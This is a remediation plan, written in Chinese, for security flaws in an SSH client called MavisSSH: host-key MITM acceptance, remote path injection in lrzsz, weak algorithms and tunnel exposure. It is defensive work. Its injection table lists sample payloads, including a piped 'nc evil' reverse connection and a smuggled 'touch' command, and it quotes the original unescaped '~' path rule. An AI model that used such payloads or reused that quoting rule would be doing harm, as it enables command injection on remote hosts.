# 安全整改计划：MavisSSH

> **状态**：整改中。2026-10-20 三位专家评审通过。
> **红线**：以下 P0 项必须整改完成才能算闭环。
> **依据**：`docs/SECURITY_REVIEW_2026-10-20.md`（三份独立评审 + 逐条核实）。
>
> **进度（2026-10-20，第二轮补齐）**：
>
> | 项 | 状态 | 判据 / 说明 |
> |---|---|---|
> | P0-1 主机密钥（MITM） | ✅ **已整改** | `tests/_fhostkey.py` 46 条全绿 |
> | P0-2 lrzsz 注入 | ✅ **已整改** | `tests/_fshelljoin.py` 40 条全绿 |
> | P0-3 弱算法禁用 | ✅ **已整改** | 含在 `_fhostkey.py` 的算法断言里 |
> | P1-4 指纹展示 | ✅ 已整改 | 新增 `sshclient/ui/hostkey_dialog.py`：复制按钮 + **手输指纹自动比对** |
> | P1-5 错误文案分类 | ✅ 已整改 | 四类：主机密钥 / 服务器拒绝 / 网络不可达 / 认证失败 |
> | P1-6 `proxy_command` | ✅ 已整改 | **字段与分支已删除**（原为死代码，`Popen(shell=True)` 的执行面） |
> | P1-7 隧道 `0.0.0.0` | ✅ 已整改 | 新增 `is_exposed_address()`；bind 成功时写明「对局域网可见」 |
> | P2-8 认证失败重输口令 | ✅ 已整改 | 认证失败弹 `ConnectDialog` 让用户重输并自动重连 |
> | P2-9 paramiko 版本下限 | ✅ 已整改 | `paramiko>=5.0,<6`（CVE-2026-44405 影响 4.0.0 之前） |
> | 「仅此一次」信任选项 | ✅ 已整改 | prompt 改返回三态决策 `TRUST`/`TRUST_ONCE`/`REJECT` |
> | 「已信任主机」管理面板 | ✅ 已整改 | 设置里新增「主机密钥」页：列出/删除/导入 |
> | 导入既有 known_hosts | ✅ 已整改 | 从 `~/.ssh/known_hosts` 勾选导入，**不覆盖已有记录** |
> | lrzsz `~` 展开失败文案 | ✅ 已整改 | 「~用户名不存在」与「文件不存在」分开说 |
>
> 新增判据：`tests/_fhostkey2.py`（信任库管理 + 指纹比对 + 三态决策 + 错误分类）

---

## 0. 结论

两个安全缺陷，外加三个评审各自挖出的相邻问题：

| # | 问题 | 位置 | 性质 | 级别 |
|---|---|---|---|---|
| 1 | 主机密钥无条件接受（MITM） | `sshclient/remote/connection.py:465` | 中间人 | **P0** |
| 2 | lrzsz 远端路径注入（**两处**） | `sshclient/core/lrzsz.py:281` + `sshclient/ui/main_window.py:1224` | 自注入 | **P0** |
| 3 | `BadHostKeyException` 被吞成「连接失败」 | `sshclient/remote/connection.py:492` | 告警失效 | **P0** |
| 4 | 主机密钥指纹算了但界面从不展示 | `sshclient/remote/connection.py:508` | 告警失效 | P1 |
| 5 | 弱算法未禁用（`3des-cbc` / `hmac-md5` / `hmac-sha1`） | `sshclient/remote/connection.py` | 降级 | P1 |
| 6 | `proxy_command` 是本机命令执行面 | `sshclient/remote/connection.py:469` | 潜伏 | P1 |
| 7 | 隧道 `0.0.0.0` 可从导入的配置文件静默带入 | `sshclient/core/tunnel.py:144` | 暴露 | P1 |
| 8 | 认证失败后静默复用旧口令重试 | `sshclient/ui/main_window.py:2709` | 可用性 | P2 |
| 9 | `paramiko` 版本未钉下限 | `requirements.txt` | 供应链 | P2 |

---

## 1. P0-1 主机密钥（MITM）

### 1.1 事实基础（已核实）

- `paramiko 5.0.0` 的 `SSHClient.__init__` 里 **`self._policy = RejectPolicy()`**
  —— paramiko **默认就是拒绝**。MITM 是我们在 `connection.py:465`
  主动降级出来的，不是「paramiko 就是这样」。
- `AutoAddPolicy` 只往 `client._host_keys`（进程内）写，而
  `client._host_keys_filename` 恒为 `None` → **paramiko 从未落盘过任何东西**。
  后果：现存用户**没有任何指纹基线**，升级后每台主机必然走一次「未知」分支。
- 现有代码**既没 `load_system_host_keys()` 也没 `load_host_keys()`**
  → 用户 `~/.ssh/known_hosts` 里的条目根本没被读进来，paramiko 连「比对」
  这步都不存在。

### 1.2 修法

新建 `sshclient/remote/hostkeys.py`（**不依赖 Qt**，只认一个
`Callable[[HostKeyRequest], bool]`，弹窗留给 UI 层）：

- `sha256_fingerprint(key)` —— OpenSSH 的 `SHA256:base64` 指纹
- `extract_port(hostname)` —— known_hosts 键名 `[host]:2222` → 2222
- `HostKeyRequest` —— 冻结 dataclass，携带 hostname/port/key_type/fingerprint/key
- `PromptHostKeyPolicy(paramiko.MissingHostKeyPolicy)` —— 未知主机问用户，
  接受则 `client._host_keys.add()` + `client.save_host_keys()`
- `known_hosts_path()` —— `%APPDATA%\MavisSSH\known_hosts`（复用
  `core/settings.py` 的 `_config_dir()`）

`connect()` 重写：

```python
client = paramiko.SSHClient()
client.load_system_host_keys()                      # 只读：用户 ssh 认过的直接认
try:
    client.load_host_keys(known_hosts_path())       # 可写：MavisSSH 自己的信任
except IOError:
    pass
client.set_missing_host_key_policy(
    PromptHostKeyPolicy(prompt) if prompt else paramiko.RejectPolicy()
)
```

**双轨读、单轨写**：`~/.ssh/known_hosts` 读不写（不污染用户自己的严格策略），
`%APPDATA%\MavisSSH\known_hosts` 读写。

> **落盘必须用 `client.save_host_keys()` 而不是 `HostKeys.save()`** ——
> 前者写之前会**重读一次文件**以合并别的 SSH 客户端的并发写入，后者会丢条目。

### 1.3 首次连接确认（跨线程）

`connect()` 跑在**工作线程**（`sshclient/ui/main_window.py:2716-2730`），
paramiko 的 `missing_host_key()` 是**同步回调** → 不能在工作线程弹 Qt 模态框。

**两阶段**：回调里 `threading.Event.wait()` 阻塞 worker，
用 `QueuedConnection` 把请求投到主线程；主线程弹框，决策写回后 `Event.set()`。

必须满足：

- 用 `QueuedConnection`，**不是 `BlockingQueuedConnection`**（后者是死锁来源）
- `Event.set()` 放在 `finally` 里 —— UI 线程上任何异常都会让 worker 永远等下去
- 确认动作设**超时**（建议 120s），主窗口关闭时也要 `set()` 并回「取消」
- 弹窗期间保持 `_connect_inflight = True`（`main_window.py:2702` 已有该防护）
- 磁盘 IO 放工作线程，主线程只负责问人
- `missing_host_key()` 给的 hostname **原样使用**做 known_hosts 键，不要自己拼

### 1.4 必须单独接住 `BadHostKeyException`

`paramiko.BadHostKeyException` **是 `SSHException` 的子类**（已核实 MRO），所以
现在被 `connection.py:492` 的 `except (paramiko.SSHException, OSError)` 吞成
泛化的「连接失败」。改完策略后，「密钥变了」= 可能存在中间人，**绝不能混成
普通连接失败**。

新异常类型 `SSHHostKeyChangedError`，并且 `except` 顺序必须把它排在
`SSHException` **之前**。

### 1.5 过渡方案

不信任也要能记住：`SavedSession` 加 `host_key_policy: 'ask' | 'always' | 'never'`。
`'never'` 直接拒且不弹窗（否则用户每次都被问，比现在的静默接受更烦）。

**不做**「首次启动批量信任所有已保存会话」—— 那等于把同一个 MITM 风险一次性
打包，性质与原漏洞相同。

---

## 2. P0-2 lrzsz 远端命令注入

### 2.1 事实基础（已核实）

`lrzsz.py:281` 的规则是**按前缀分支**：

```python
return " ".join(p if p.startswith("~") else shlex.quote(p) for p in paths)
```

`~` 开头 → 完全放弃转义。而下游直接拼进远端 shell：

- `lrzsz.py:314` —— `conn.exec("i=0; for p in %s; do ...")`
- `main_window.py:1224` —— `sendall("sz " + shell_join(targets))`，**打进交互式
  登录 shell**，注入面比第一处更直接

实测（`tests/_probe_shelljoin*.py`）：

| 输入 | 远端实际收到 | 后果 |
|---|---|---|
| `~/a; touch pwned.md` | `['~/a;touch', 'pwned.md']` | 多执行一条命令 |
| `~/a > /tmp/x` | `['~/a', '>', '/tmp/x']` | 远端写文件 |
| `~/a \| nc evil 1 4444` | 5 个额外 token | 远端反向连外网 |
| `~/my docs/t.md` | `['~/my', 'docs/t.md']` | 拆成两个参数 |
| `/tmp/a;touch pwned.md`（无 `~`） | 单个字面量 | ✅ 正确 |

同一批输入**只因 `~` 前缀就不转义** → 是规则缺口，不是设计意图。

### 2.2 修法：词内 `${HOME}` 插值

**原则：别按值决定转义策略，按「整体结构」决定。本地只安全地传值，
解释权归远端，且用远端自己的词法、不要 `eval`。**

```python
def remote_word(path: str) -> str:
    if path == "~":
        return '"${HOME}"'
    if path.startswith("~/"):
        return '"${HOME}"/' + shlex.quote(path[2:])
    return shlex.quote(path)

def remote_words(paths: list[str]) -> str:
    return " ".join(remote_word(p) for p in paths)
```

远端脚本（`check_remote_paths`）：

```sh
i=0; for p in "${HOME}"/'docs/t.md' '/tmp/a;b'; do
  if [ -e "$p" ]; then echo "MAVISP 1 $i"; else echo "MAVISP 0 $i"; fi
  i=$((i+1)); done; echo MAVISP done
```

**「回序号」协议不变** —— 远端仍只回 `MAVISP <0|1> <i>`，解析段一行不用改。
变的只是「传进去的词」：`~` 仍在远端展开，但展开发生在远端。

**明确否掉 `eval echo "$p"`** —— 双引号里 `~` 不展开（达不到目的），
而 `eval` 会二次解析，`$(...)`、反引号在里面照常执行，等于把注入原样装回去。

### 2.3 必须改的既有判据

`tests/_download.py:57-68` **正在钉住那条有缺陷的规则**：

```python
check("~ 路径**不加引号**（bash 单引号会抑制 ~ 展开）",
      lrzsz.shell_join(["~/docs/t.md"]) == "~/docs/t.md", ...)
```

这条判据是**过期**的（不是产品坏了）。要改成钉新规则。

### 2.4 新判据（离线可跑）

用 `shlex.shlex(punctuation_chars=True)` 模拟远端 bash 分词，断言：

1. 远端 argv 数 == 输入路径数
2. 路径数据**不引入裸操作符**（`;` `|` `>` `` ` `` `$(` 不能作为独立 token 出现）
3. `~` 展开保留
4. 载荷完整落在单个 token 内
5. **元断言：把旧实现装回去必须红**（否则判据恒真）

---

## 3. P1 相邻问题

| # | 修法 | 备注 |
|---|---|---|
| 4 指纹不展示 | 首次连接框展示 SHA-256 + MD5 兼容行（MD5 要**冒号分隔**，现在是无分隔 hex，用户拿手上的资料无法目视比对）+ 复制按钮 | 指纹现在只进日志 |
| 5 弱算法 | `_DISABLED_ALGORITHMS`：禁 `3des-cbc`/`arcfour`/`blowfish-cbc`/`cast128-cbc`/`des-cbc` + `hmac-md5`/`hmac-md5-96`/`hmac-sha1`/`hmac-sha1-96` | **绝不砍唯一强项**（paramiko #2126 教训：禁 GEX 导致 Win/macOS 交集清空、握手直接失败） |
| 6 proxy_command | 现在删字段+分支；要留则改 argv 列表、`shell=False` 自己 `Popen`、UI 原文回显待执行命令 | `paramiko.ProxyCommand` 内部是 `Popen(cmd, shell=True)` |
| 7 隧道 0.0.0.0 | 从文件加载时非回环地址标记 `needs_confirm`，连接时弹一次并写日志；`::` 拒绝或强制 `AF_INET` | 提示目前只在「加规则时的 tooltip」，拷贝来的会话文件能静默带上 |

## 4. P2

- 认证失败 → 弹 `ConnectDialog` 让用户重输口令（现在静默复用旧口令）
- 错误文案中文化 + 四类分类（认证失败／网络不可达／**主机密钥问题**／服务器拒绝）
- `requirements.txt` 钉 `paramiko>=5.0,<6`（CVE-2026-44405 影响 4.0.0 之前，5.0.0 已修）

---

## 5. 受影响判据清单

改动会踩到的既有判据，**每条都要人工确认是「过期」还是「我改坏了」**：

| 文件:行 | 断言内容 | 处理 |
|---|---|---|
| `tests/_fconn.py:751` | `inspect.getsource(SSHConnection.connect)` 源码断言 | 改 `connect()` 会红 —— 先看它断言什么 |
| `tests/_fconn.py:863` | `connect()` 的 kwargs 断言 | 同上 |
| `tests/_fconn.py:882` | 「proxy_command 在生产侧无实参来源」 | 删字段后要改 |
| `tests/_download.py:57-68` | 「`~` 路径**不加引号**」 | **过期**，要改成钉新规则 |
| `tests/_e2e.py:457-463` | `server_fingerprint()` 的 MD5 回退 | 保留，但可能要加冒号分隔 |

---

## 6. 实施顺序

```
P0-2 lrzsz 注入（1.5h，纯函数+两调用点+判据，回滚最容易）
  ↓
P0-1 MITM 主体（known_hosts 加载 + 首次确认 + BadHostKeyException）约 6h
  ↓
P0-3 / P1-5 弱算法 + 判据（1h，可与上面并行）
  ↓
P1 其余（指纹展示、错误文案、proxy_command、隧道确认）约 6h
  ↓
P2（3h）
```

**先合 P0-2**：它自包含、风险最低，且能立刻消灭两个注入点。
